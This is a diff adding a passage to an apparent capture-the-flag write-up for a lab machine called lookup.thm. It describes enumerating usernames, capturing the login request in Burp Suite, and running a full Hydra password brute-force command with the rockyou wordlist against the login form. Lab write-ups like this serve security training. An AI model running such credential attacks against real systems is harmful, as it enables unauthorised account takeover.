@@ -96,3 +96,19 @@ except FileNotFoundError:
 except requests.RequestException as e:
     print(f"Error: An HTTP request error occurred: {e}")
 ```
+
+This quickly reveals the two correct usernames:
+
+![usernames](https://github.com/user-attachments/assets/372288dd-5cb0-41f1-992a-a837f8e8a90e)
+
+Then I used burp suite repeater to caprute the login request and response to craft a hydra command.
+
+![repeater](https://github.com/user-attachments/assets/2c9bf332-855c-4380-b8ae-0075ddec7767)
+
+I created a users.txt file containing admin and jose.
+
+Then ran this hydra command:
+``` bash
+hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again." -IV -t 64
+```
+I quickly reveals jose's simple password. We will now log into the login panel.
